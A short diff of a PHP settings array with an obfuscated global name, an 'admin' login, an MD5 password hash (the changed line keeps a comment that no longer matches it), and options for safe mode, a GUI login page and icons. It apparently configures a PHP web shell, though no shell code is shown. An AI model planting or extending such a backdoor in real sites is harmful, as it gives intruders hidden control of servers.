@@ -1,7 +1,7 @@
 <?php
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'admin',
-    'password' => '1a1dc91c907325c69271ddf0c944bc72', //md5(ehsan)
+    'password' => '96d3e4c47a1f96eddede2bccd36ce2b9', //md5(ehsan)
     'safe_mode' => '1',
     'login_page' => 'gui',
     'show_icons' => '1',
